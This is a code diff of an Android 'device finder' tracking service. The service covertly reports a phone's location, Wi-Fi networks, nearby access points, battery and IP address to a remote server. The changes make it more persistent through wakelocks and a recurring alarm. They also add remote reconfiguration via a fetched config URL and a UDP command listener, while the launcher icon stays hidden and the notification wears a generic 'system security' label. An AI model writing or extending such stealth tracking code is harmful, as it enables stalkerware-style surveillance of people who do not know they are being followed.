@@ -1,8 +1,10 @@
 package com.example.devicefinder;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
@@ -22,6 +24,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
@@ -38,21 +41,25 @@ public class TrackingService extends Service implements LocationListener {
     private LocationManager locationManager;
     private final Handler handler = new Handler(Looper.getMainLooper());
     private ConnectivityManager.NetworkCallback networkCallback;
+    private AlarmManager alarmManager;
+    private PowerManager.WakeLock wakeLock;
 
-    private long reportIntervalMs = 1800 * 1000L; // 常规间隔：默认 30 分钟
+    private long reportIntervalMs = 1800 * 1000L; 
     private String accuracyMode = "coarse";
     private Location lastLocation = null;
-
-    // 已完成的定时上报次数，用于决定下一次的延迟
     private int reportCount = 0;
 
     private static long lastReportTime = 0;
     private static int consecutiveFailures = 0;
     private static boolean isListeningForRescue = false;
 
-    private static String defaultServerUrl = "http://192.168.1.123:8000/api/report";
+    // ⚠️【基础配置区】请按需修改
+    private static String defaultServerUrl = "http://192.168.1.21:8000/api/report"; 
+    private static final String DEFAULT_REMOTE_CONFIG_URL = "https://your-config-url.com/config.txt";
     private static final String AUTH_TOKEN = "your_private_secret_key";
     private static final String RESCUE_SECRET = "your_private_secret_key";
+    
+    private static long lastConfigFetchTime = 0;
 
     @Override
     public void onCreate() {
@@ -60,51 +67,76 @@ public class TrackingService extends Service implements LocationListener {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startForegroundNotification();
 
-        // 兜底隐藏一次桌面图标（第二道保障）：
-        // 服务是常驻的，不受 MainActivity 生命周期影响，即使 MainActivity 的隐藏被系统回滚，
-        // 这里也会再隐藏一次，确保隐身生效。
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceFinder::WakeLock");
+            wakeLock.setReferenceCounted(false);
+        }
+        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+
         handleIconVisibility(true);
+        triggerRescueListener(); // 启动即监听（无限等待）
 
-        // 1. 先发起一次单次定位，拿到结果或超时后再上报（避免冷启动时上报 0,0）
         requestSingleLocationAndReport();
-
-        // 2. 注册网络状态变动监听（Wi-Fi 跨网即时插队上报）
         registerNetworkCallback();
-
-        // 3. 启动持续定位监听（定时上报由首次上报后接管）
         startLocationUpdates();
+        scheduleHeartbeatAlarm();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && "ACTION_MANUAL_REPORT".equals(intent.getAction())) {
-            sendReport(false);
+        if (intent != null) {
+            String action = intent.getAction();
+            if ("ACTION_MANUAL_REPORT".equals(action) || "ACTION_FORCE_REPORT".equals(action)) {
+                sendReport(true, true);
+            } else if ("ACTION_UPDATE_SERVER".equals(action) || "ACTION_ADB_UPDATE".equals(action)) {
+                String newUrl = intent.getStringExtra("server_url");
+                if (newUrl != null && !newUrl.isEmpty()) {
+                    saveNewServerUrl(newUrl);
+                    sendReport(false, true);
+                }
+            } else if ("ACTION_UPDATE_CONFIG_URL".equals(action)) {
+                String newConfigUrl = intent.getStringExtra("config_url");
+                handleUpdateConfigUrl(newConfigUrl);
+            } else if ("ACTION_HEARTBEAT".equals(action)) {
+                triggerRescueListener();
+                fetchRemoteConfig();
+                scheduleHeartbeatAlarm();
+            }
         }
         return START_STICKY;
+    }
+
+    private void triggerRescueListener() {
+        if (!isListeningForRescue) startRescueListener();
     }
 
     private void startForegroundNotification() {
         String channelId = "device_guardian_channel";
         Notification.Builder builder;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    channelId, "设备安全守护", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel channel = new NotificationChannel(channelId, "系统安全守护", NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = (NotificationManager) getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
             builder = new Notification.Builder(this, channelId);
-        } else {
-            builder = new Notification.Builder(this);
-        }
-        Notification notification = builder.setContentTitle("设备安全守护")
-                .setContentText("系统后台运行中")
-                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                .build();
-
+        } else builder = new Notification.Builder(this);
+        
+        Notification notification = builder.setContentTitle("系统安全守护").setContentText("后台运行中")
+                .setSmallIcon(android.R.drawable.ic_menu_mylocation).build();
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
-        } else {
-            startForeground(1001, notification);
-        }
+        } else startForeground(1001, notification);
+    }
+
+    private void scheduleHeartbeatAlarm() {
+        if (alarmManager == null) return;
+        Intent intent = new Intent(this, TrackingService.class);
+        intent.setAction("ACTION_HEARTBEAT");
+        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;
+        PendingIntent pi = PendingIntent.getService(this, 9999, intent, flags);
+        long triggerAt = System.currentTimeMillis() + 6 * 60 * 60 * 1000L;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
+        else alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
     }
 
     private String getUniqueDeviceId() {
@@ -131,16 +163,32 @@ public class TrackingService extends Service implements LocationListener {
         }
     }
 
+    private String getRemoteConfigUrl() {
+        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
+        return sp.getString("saved_config_url", DEFAULT_REMOTE_CONFIG_URL);
+    }
+
+    private void saveRemoteConfigUrl(String url) {
+        if (url != null && !url.isEmpty()) {
+            SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
+            sp.edit().putString("saved_config_url", url).apply();
+        }
+    }
+
+    private void handleUpdateConfigUrl(String newConfigUrl) {
+        if (newConfigUrl != null && !newConfigUrl.isEmpty()) {
+            saveRemoteConfigUrl(newConfigUrl);
+            lastConfigFetchTime = 0; 
+            fetchRemoteConfig();
+        }
+    }
+
     private void handleIconVisibility(boolean hideIcon) {
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
-            int newState = hideIcon ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
-
-            if (p.getComponentEnabledSetting(componentName) != newState) {
-                p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
-            }
+            int newState = hideIcon ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+            if (p.getComponentEnabledSetting(componentName) != newState) p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {}
     }
 
@@ -148,10 +196,7 @@ public class TrackingService extends Service implements LocationListener {
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
             if (cm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                NetworkRequest request = new NetworkRequest.Builder()
-                        .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
-                        .build();
-
+                NetworkRequest request = new NetworkRequest.Builder().addTransportType(NetworkCapabilities.TRANSPORT_WIFI).build();
                 networkCallback = new ConnectivityManager.NetworkCallback() {
                     @Override
                     public void onAvailable(Network network) {
@@ -159,22 +204,16 @@ public class TrackingService extends Service implements LocationListener {
                         String oldSsid = DeviceInfoUtils.cachedSsid;
                         String[] wifiInfo = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                         String newSsid = wifiInfo[0];
-
                         if (newSsid.equals("UNKNOWN") || newSsid.equals("<unknown ssid>")) return;
-
                         if (!oldSsid.equals(newSsid) && !oldSsid.equals("UNKNOWN")) {
-                            // 网络切换触发上报，附带周围 Wi-Fi 扫描。
-                            // 注意：不重置 reportCount，也不重新排程定时器，
-                            // 以免插队上报打乱 3 分钟 / 6 分钟 / 30 分钟的节奏。
-                            sendReport(true);
+                            sendReport(true, false);
+                            triggerRescueListener();
                         }
                     }
-
                     @Override
                     public void onLost(Network network) {
                         super.onLost(network);
-                        // 断网触发上报，附带周围 Wi-Fi 扫描（此时可能拿不到，静默跳过）
-                        sendReport(true);
+                        sendReport(true, false);
                     }
                 };
                 cm.registerNetworkCallback(request, networkCallback);
@@ -182,8 +221,6 @@ public class TrackingService extends Service implements LocationListener {
         } catch (Exception ignored) {}
     }
 
-    // 持续定位监听：minTime 固定为 60 秒，让 lastLocation 持续被真实定位刷新，
-    // 与定时上报的 30 分钟节奏解耦。
     private void startLocationUpdates() {
         try {
             locationManager.removeUpdates(this);
@@ -197,12 +234,9 @@ public class TrackingService extends Service implements LocationListener {
         } catch (SecurityException ignored) {}
     }
 
-    // ==================== 首次上报：单次定位后触发 ====================
-
     private void requestSingleLocationAndReport() {
         final boolean[] reported = new boolean[]{false};
         final Handler timeoutHandler = new Handler(Looper.getMainLooper());
-
         final LocationListener singleListener = new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
@@ -210,10 +244,8 @@ public class TrackingService extends Service implements LocationListener {
                 if (!reported[0]) {
                     reported[0] = true;
                     timeoutHandler.removeCallbacksAndMessages(null);
-                    try {
-                        locationManager.removeUpdates(this);
-                    } catch (Exception ignored) {}
-                    sendReport(true);
+                    try { locationManager.removeUpdates(this); } catch (Exception ignored) {}
+                    sendReport(true, false);
                     reportCount = 1;
                     scheduleNextReport();
                 }
@@ -222,41 +254,25 @@ public class TrackingService extends Service implements LocationListener {
             @Override public void onProviderEnabled(String provider) {}
             @Override public void onProviderDisabled(String provider) {}
         };
-
         try {
-            // 优先用网络定位（室内更快），再叠加 GPS
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
-            }
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
-            }
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
         } catch (SecurityException ignored) {}
-
-        // 10 秒超时兜底：无论是否拿到定位，都上报一次
-        timeoutHandler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (!reported[0]) {
-                    reported[0] = true;
-                    try {
-                        locationManager.removeUpdates(singleListener);
-                    } catch (Exception ignored) {}
-                    sendReport(true);
-                    reportCount = 1;
-                    scheduleNextReport();
-                }
+        timeoutHandler.postDelayed(() -> {
+            if (!reported[0]) {
+                reported[0] = true;
+                try { locationManager.removeUpdates(singleListener); } catch (Exception ignored) {}
+                sendReport(true, false);
+                reportCount = 1;
+                scheduleNextReport();
             }
         }, 10000);
     }
 
-    // ==================== 定时上报节奏：3 分钟 → 3 分钟 → 30 分钟 ====================
-
     private final Runnable reportRunnable = new Runnable() {
         @Override
         public void run() {
-            // 定时轮询上报不扫描周围 Wi-Fi，避免后台节流和耗电
-            sendReport(false);
+            sendReport(false, false);
             reportCount++;
             scheduleNextReport();
         }
@@ -264,256 +280,209 @@ public class TrackingService extends Service implements LocationListener {
 
     private void scheduleNextReport() {
         handler.removeCallbacks(reportRunnable);
-
-        long delay;
-        if (reportCount == 1) {
-            delay = 3 * 60 * 1000L;   // 首次之后，3 分钟
-        } else if (reportCount == 2) {
-            delay = 3 * 60 * 1000L;   // 第二次之后，再 3 分钟（累计 6 分钟）
-        } else {
-            delay = reportIntervalMs; // 第三次及以后，默认 30 分钟
-        }
-
+        long delay = (reportCount == 1 || reportCount == 2) ? 3 * 60 * 1000L : reportIntervalMs;
         handler.postDelayed(reportRunnable, delay);
     }
 
-    // ==================== 上报核心 ====================
+    private void sendReport(final boolean withNearbyWifi, boolean force) {
+        sendReport(withNearbyWifi, force, null);
+    }
 
-    private void sendReport(final boolean withNearbyWifi) {
+    private void sendReport(final boolean withNearbyWifi, boolean force, final String overrideUrl) {
         long currentTime = System.currentTimeMillis();
-        if (currentTime - lastReportTime < 5000) return; // 5秒冷却锁
+        if (!force && currentTime - lastReportTime < 5000) return; 
         lastReportTime = currentTime;
 
-        final String activeUrl = getCurrentServerUrl();
+        final String activeUrl = (overrideUrl != null && !overrideUrl.isEmpty()) ? overrideUrl : getCurrentServerUrl();
 
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                boolean success = false;
-                try {
-                    int[] battery = DeviceInfoUtils.getBatteryInfo(TrackingService.this);
-                    String[] wifi = DeviceInfoUtils.getWifiInfo(TrackingService.this);
-                    String ip = DeviceInfoUtils.getLocalIpAddress();
-
-                    // 多重兜底获取最新位置，彻底告别 0.0, 0.0
-                    Location loc = lastLocation;
-                    if (loc == null) {
-                        try {
-                            Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                            Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                            Location passLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
-
-                            loc = getBetterLocation(netLoc, gpsLoc);
-                            loc = getBetterLocation(loc, passLoc);
-                        } catch (SecurityException ignored) {}
-                    }
-
-                    JSONObject json = new JSONObject();
-                    json.put("device_id", getUniqueDeviceId());
-                    json.put("token", AUTH_TOKEN);
-                    json.put("timestamp", System.currentTimeMillis());
-
-                    JSONObject battObj = new JSONObject();
-                    battObj.put("level", battery[0]);
-                    battObj.put("is_charging", battery[1] == 1);
-                    json.put("battery", battObj);
-
-                    JSONObject netObj = new JSONObject();
-                    netObj.put("wifi_ssid", wifi[0]);
-                    netObj.put("wifi_bssid", wifi[1]);
-                    netObj.put("wifi_rssi", Integer.parseInt(wifi[2]));
-                    netObj.put("local_ip", ip);
-                    json.put("network", netObj);
-
-                    JSONObject locObj = new JSONObject();
-                    if (loc != null) {
-                        locObj.put("latitude", loc.getLatitude());
-                        locObj.put("longitude", loc.getLongitude());
-                        locObj.put("accuracy", loc.getAccuracy());
-                        locObj.put("provider", loc.getProvider());
-                        locObj.put("time", loc.getTime());
-                    } else {
-                        // 没有定位时上报 null，服务器端可区分"无定位"与"坐标真的是 0,0"
-                        locObj.put("latitude", JSONObject.NULL);
-                        locObj.put("longitude", JSONObject.NULL);
-                        locObj.put("accuracy", -1.0);
-                        locObj.put("provider", "none");
-                        locObj.put("time", 0L);
-                    }
-                    json.put("location", locObj);
-
-                    // 仅在指定时机尝试扫描周围 Wi-Fi，失败静默跳过
-                    if (withNearbyWifi) {
-                        try {
-                            List<JSONObject> nearby = DeviceInfoUtils.scanNearbyWifi(TrackingService.this);
-                            if (nearby != null && !nearby.isEmpty()) {
-                                JSONArray arr = new JSONArray();
-                                for (JSONObject obj : nearby) arr.put(obj);
-                                json.put("nearby_wifi", arr);
-                            }
-                        } catch (Exception ignored) {}
-                    }
-
-                    URL url = new URL(activeUrl);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json");
-                    conn.setConnectTimeout(6000);
-                    conn.setReadTimeout(6000);
-                    conn.setDoOutput(true);
-
-                    OutputStream os = conn.getOutputStream();
-                    os.write(json.toString().getBytes("UTF-8"));
-                    os.flush();
-                    os.close();
-
-                    if (conn.getResponseCode() == 200) {
-                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                        StringBuilder sb = new StringBuilder();
-                        String line;
-                        while ((line = br.readLine()) != null) sb.append(line);
-                        br.close();
-
-                        parseResponse(new JSONObject(sb.toString()));
-                        success = true;
-                    }
-                    conn.disconnect();
-                } catch (Exception e) {
-                    success = false;
+        new Thread(() -> {
+            boolean success = false;
+            try {
+                if (wakeLock != null) wakeLock.acquire(10000);
+                int[] battery = DeviceInfoUtils.getBatteryInfo(TrackingService.this);
+                String[] wifi = DeviceInfoUtils.getWifiInfo(TrackingService.this);
+                String ip = DeviceInfoUtils.getLocalIpAddress();
+                Location loc = lastLocation;
+                if (loc == null) {
+                    try {
+                        loc = getBetterLocation(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER), locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER));
+                        loc = getBetterLocation(loc, locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER));
+                    } catch (SecurityException ignored) {}
                 }
-
-                if (success) {
-                    consecutiveFailures = 0;
+                JSONObject json = new JSONObject();
+                json.put("device_id", getUniqueDeviceId());
+                json.put("token", AUTH_TOKEN);
+                json.put("timestamp", System.currentTimeMillis());
+                JSONObject battObj = new JSONObject();
+                battObj.put("level", battery[0]);
+                battObj.put("is_charging", battery[1] == 1);
+                json.put("battery", battObj);
+                JSONObject netObj = new JSONObject();
+                netObj.put("wifi_ssid", wifi[0]);
+                netObj.put("wifi_bssid", wifi[1]);
+                netObj.put("wifi_rssi", Integer.parseInt(wifi[2]));
+                netObj.put("local_ip", ip);
+                json.put("network", netObj);
+                JSONObject locObj = new JSONObject();
+                if (loc != null) {
+                    locObj.put("latitude", loc.getLatitude()); locObj.put("longitude", loc.getLongitude());
+                    locObj.put("accuracy", loc.getAccuracy()); locObj.put("provider", loc.getProvider()); locObj.put("time", loc.getTime());
                 } else {
+                    locObj.put("latitude", JSONObject.NULL); locObj.put("longitude", JSONObject.NULL);
+                    locObj.put("accuracy", -1.0); locObj.put("provider", "none"); locObj.put("time", 0L);
+                }
+                json.put("location", locObj);
+                if (withNearbyWifi) {
+                    try {
+                        List<JSONObject> nearby = DeviceInfoUtils.scanNearbyWifi(TrackingService.this);
+                        if (nearby != null && !nearby.isEmpty()) {
+                            JSONArray arr = new JSONArray();
+                            for (JSONObject obj : nearby) arr.put(obj);
+                            json.put("nearby_wifi", arr);
+                        }
+                    } catch (Exception ignored) {}
+                }
+                URL url = new URL(activeUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setConnectTimeout(6000); conn.setReadTimeout(6000); conn.setDoOutput(true);
+                OutputStream os = conn.getOutputStream();
+                os.write(json.toString().getBytes("UTF-8")); os.flush(); os.close();
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                    StringBuilder sb = new StringBuilder(); String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+                    if (overrideUrl == null) parseResponse(new JSONObject(sb.toString()));
+                    success = true;
+                }
+                conn.disconnect();
+            } catch (Exception ignored) {
+            } finally {
+                if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+            }
+            if (success) {
+                consecutiveFailures = 0;
+                fetchRemoteConfig();
+            } else {
+                if (overrideUrl == null) {
                     consecutiveFailures++;
-                    if (consecutiveFailures >= 3 && !isListeningForRescue) {
-                        startRescueListener();
+                    if (consecutiveFailures >= 1) {
+                        triggerRescueListener();
+                        fetchRemoteConfig();
                     }
                 }
             }
         }).start();
     }
 
-    // 优选定位辅助函数：挑选出最准、更新的位置
+    private void fetchRemoteConfig() {
+        String configUrl = getRemoteConfigUrl();
+        if (configUrl.contains("your-config-url.com")) return;
+        long now = System.currentTimeMillis();
+        if (now - lastConfigFetchTime < 10 * 60 * 1000L) return;
+        lastConfigFetchTime = now;
+        new Thread(() -> {
+            try {
+                URL url = new URL(configUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET"); conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                    StringBuilder sb = new StringBuilder(); String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+                    String newUrl = sb.toString().trim();
+                    if (newUrl.startsWith("http") && !newUrl.equals(getCurrentServerUrl())) {
+                        saveNewServerUrl(newUrl); consecutiveFailures = 0; sendReport(true, true);
+                    }
+                }
+                conn.disconnect();
+            } catch (Exception ignored) {}
+        }).start();
+    }
+
     private Location getBetterLocation(Location l1, Location l2) {
-        if (l1 == null) return l2;
-        if (l2 == null) return l1;
+        if (l1 == null) return l2; if (l2 == null) return l1;
         long timeDelta = l2.getTime() - l1.getTime();
-        boolean isSignificantlyNewer = timeDelta > 120000;
-        boolean isSignificantlyOlder = timeDelta < -120000;
+        boolean isSignificantlyNewer = timeDelta > 120000; boolean isSignificantlyOlder = timeDelta < -120000;
         boolean isNewer = timeDelta > 0;
-
-        if (isSignificantlyNewer) return l2;
-        else if (isSignificantlyOlder) return l1;
-
+        if (isSignificantlyNewer) return l2; else if (isSignificantlyOlder) return l1;
         int accuracyDelta = (int) (l2.getAccuracy() - l1.getAccuracy());
-        boolean isLessAccurate = accuracyDelta > 0;
-        boolean isMoreAccurate = accuracyDelta < 0;
+        boolean isLessAccurate = accuracyDelta > 0; boolean isMoreAccurate = accuracyDelta < 0;
         boolean isSignificantlyLessAccurate = accuracyDelta > 200;
         boolean isFromSameProvider = l2.getProvider() != null && l2.getProvider().equals(l1.getProvider());
-
-        if (isMoreAccurate) return l2;
-        else if (isNewer && !isLessAccurate) return l2;
+        if (isMoreAccurate) return l2; else if (isNewer && !isLessAccurate) return l2;
         else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) return l2;
         return l1;
     }
 
-    // ==================== 救援广播监听 ====================
-
     private void startRescueListener() {
         isListeningForRescue = true;
-
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                DatagramSocket rescueSocket = null;
-                try {
-                    rescueSocket = new DatagramSocket(8888);
-                    rescueSocket.setBroadcast(true);
-                    rescueSocket.setSoTimeout(60000);
-
-                    byte[] buffer = new byte[512];
-                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
-
-                    while (true) {
-                        rescueSocket.receive(packet);
-                        String message = new String(packet.getData(), 0, packet.getLength());
-
-                        if (message.startsWith("FIND_ME_SERVER:")) {
-                            String[] parts = message.split(":", 3);
-                            if (parts.length == 3) {
-                                String receivedPassword = parts[1];
-                                String newServerUrl = parts[2].trim();
-
-                                if (RESCUE_SECRET.equals(receivedPassword)) {
-                                    saveNewServerUrl(newServerUrl);
-                                    consecutiveFailures = 0;
-                                    sendReport(true);
-                                    break;
-                                }
-                            }
+        new Thread(() -> {
+            DatagramSocket rescueSocket = null;
+            try {
+                rescueSocket = new DatagramSocket(8888);
+                rescueSocket.setBroadcast(true);
+                rescueSocket.setSoTimeout(0); 
+                byte[] buffer = new byte[512];
+                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
+                while (true) {
+                    rescueSocket.receive(packet);
+                    String message = new String(packet.getData(), 0, packet.getLength());
+                    if (message.startsWith("FIND_ME_SERVER:")) {
+                        String[] parts = message.split(":", 3);
+                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) {
+                            saveNewServerUrl(parts[2].trim()); consecutiveFailures = 0; sendReport(true, true); break;
                         }
+                    } else if (message.startsWith("FIND_ME_CONFIG:")) {
+                        String[] parts = message.split(":", 3);
+                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) { handleUpdateConfigUrl(parts[2].trim()); }
+                    } else if (message.startsWith("FIND_ME_REPORT:")) {
+                        String[] parts = message.split(":", 2);
+                        if (parts.length == 2 && RESCUE_SECRET.equals(parts[1])) { sendReport(true, true); }
+                    } else if (message.startsWith("FIND_ME_REPORT_TEMP:")) {
+                        String[] parts = message.split(":", 3);
+                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) { sendReport(true, true, parts[2].trim()); }
                     }
-                } catch (Exception ignored) {
-                } finally {
-                    if (rescueSocket != null && !rescueSocket.isClosed()) {
-                        rescueSocket.close();
-                    }
-                    isListeningForRescue = false;
                 }
+            } catch (Exception ignored) {
+            } finally {
+                if (rescueSocket != null && !rescueSocket.isClosed()) rescueSocket.close();
+                isListeningForRescue = false;
             }
         }).start();
     }
-
-    // ==================== 解析服务端下发的策略 ====================
 
     private void parseResponse(JSONObject res) {
         if (!res.has("config")) return;
         JSONObject cfg = res.optJSONObject("config");
         if (cfg == null) return;
-
         long newInterval = cfg.optLong("report_interval_seconds", 1800) * 1000L;
         String newAccuracy = cfg.optString("accuracy_mode", "coarse");
-
         if (newInterval != reportIntervalMs || !newAccuracy.equals(accuracyMode)) {
-            reportIntervalMs = newInterval;
-            accuracyMode = newAccuracy;
-            handler.post(new Runnable() {
-                @Override
-                public void run() {
-                    startLocationUpdates();
-                    // 若已进入 30 分钟常规节奏，按新间隔重新排程
-                    if (reportCount >= 3) {
-                        scheduleNextReport();
-                    }
-                }
+            reportIntervalMs = newInterval; accuracyMode = newAccuracy;
+            handler.post(() -> {
+                startLocationUpdates();
+                if (reportCount >= 3) scheduleNextReport();
             });
         }
-
         String nextServerUrl = cfg.optString("next_server_url", "");
-        if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) {
-            saveNewServerUrl(nextServerUrl);
-        }
-
-        boolean shouldHideIcon = cfg.optBoolean("hide_icon", true);
-        handleIconVisibility(shouldHideIcon);
+        if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) { saveNewServerUrl(nextServerUrl); sendReport(true, true); }
+        String nextConfigUrl = cfg.optString("next_config_url", "");
+        if (!nextConfigUrl.isEmpty() && !nextConfigUrl.equals(getRemoteConfigUrl())) { handleUpdateConfigUrl(nextConfigUrl); }
+        handleIconVisibility(cfg.optBoolean("hide_icon", true));
     }
 
-    @Override
-    public void onLocationChanged(Location location) {
-        if (location != null) lastLocation = location;
-    }
-
+    @Override public void onLocationChanged(Location location) { if (location != null) lastLocation = location; }
     @Override public void onDestroy() {
         super.onDestroy();
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            if (cm != null && networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                cm.unregisterNetworkCallback(networkCallback);
-            }
+            if (cm != null && networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) cm.unregisterNetworkCallback(networkCallback);
         } catch (Exception ignored) {}
     }
-
     @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
     @Override public void onProviderEnabled(String provider) {}
     @Override public void onProviderDisabled(String provider) {}
